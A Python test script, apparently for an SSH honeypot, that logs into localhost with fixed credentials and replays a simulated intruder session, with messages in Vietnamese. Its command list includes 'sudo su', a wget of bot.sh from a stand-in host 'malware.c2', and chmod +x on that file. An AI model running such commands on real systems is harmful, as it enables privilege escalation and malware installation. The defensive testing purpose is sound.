import sys
import io

if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8")

import time
import socket
import paramiko
import json
from pathlib import Path

def test_attack_simulation():
    host = "127.0.0.1"
    port = 2222
    username = "ubuntu"
    password = "p@ssword!2026"

    print(f"\n[TEST] 1. Bắt đầu mô phỏng cuộc tấn công vào {host}:{port}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host, port=port, username=username, password=password, timeout=5)
        print("[TEST] -> Kết nối SSH thành công! Được cấp quyền truy cập.")
        
        channel = client.invoke_shell()
        time.sleep(0.5)
        initial_banner = channel.recv(2048).decode("utf-8", errors="ignore")
        print(f"[TEST] -> Đã nhận Banner hệ thống:\n{initial_banner.strip()}\n")

        commands = [
            "whoami",
            "sudo -l",
            "sudo su",
            "whoami",
            "cd /tmp",
            "wget http://malware.c2/bot.sh",
            "ls -la",
            "chmod +x bot.sh",
            "ls -la bot.sh",
            "exit"
        ]

        for cmd in commands:
            print(f"[TEST] >>> Hacker gõ: {cmd}")
            channel.send(cmd + "\r")
            time.sleep(0.4)
            output = ""
            while channel.recv_ready():
                output += channel.recv(4096).decode("utf-8", errors="ignore")
            print(f"[TEST] <<< Server phản hồi:\n{output.strip()}\n" + "-"*40)

        client.close()
        print("[TEST] -> Đã đóng phiên SSH an toàn.")

    except Exception as e:
        print(f"[TEST] [LỖI] Không thể kết nối hoặc thực thi: {e}")

if __name__ == "__main__":
    test_attack_simulation()
